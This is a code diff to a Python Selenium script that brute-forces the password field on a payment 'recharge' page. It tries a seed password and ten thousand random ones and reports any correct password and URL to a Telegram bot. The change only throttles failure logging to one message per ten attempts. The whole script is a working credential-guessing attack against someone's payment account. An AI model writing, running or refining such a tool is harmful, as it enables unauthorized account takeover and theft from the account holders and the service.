@@ -13,7 +13,6 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 bot = telebot.TeleBot(BOT_TOKEN)
 
-
 initial_password = "Btc658"
 
 def generate_password(length=6):
@@ -51,6 +50,7 @@ def main():
         driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').send_keys("10")
 
         passwords = [initial_password] + [generate_password(random.randint(4, 10)) for _ in range(10000)]
+        wrong_count = 0
 
         for pwd in passwords:
             try:
@@ -63,10 +63,12 @@ def main():
                 current_url = driver.current_url
                 if "rechargePay?sn=" in current_url:
                     send_log(f"✅ Password correct: {pwd}\nURL: {current_url}")
-                    break  # stop trying
+                    break
 
-                # Send wrong password update anyway
-                send_log(f"❌ Wrong password: {pwd}")
+                wrong_count += 1
+                if wrong_count >= 10:
+                    send_log(f"❌ 10 wrong passwords tried. Last tried: {pwd}")
+                    wrong_count = 0
 
             except Exception as e:
                 send_log(f"⚠️ Error while testing password '{pwd}': {e}")
